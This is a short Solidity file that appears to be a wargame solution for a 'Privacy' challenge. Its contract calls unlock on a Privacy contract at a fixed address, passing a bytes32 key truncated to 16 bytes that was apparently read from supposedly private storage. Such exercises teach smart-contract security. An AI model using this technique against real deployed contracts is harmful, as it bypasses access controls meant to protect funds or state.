// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Privacy.sol";

contract PrivacyAttack {
    Privacy public privacy = Privacy(0x79188f6FcAc70ecFFcEF83e44D4eFe4fec981e9E);

    function attack(bytes32 _i) public{
        privacy.unlock(bytes16(_i));
    }
}
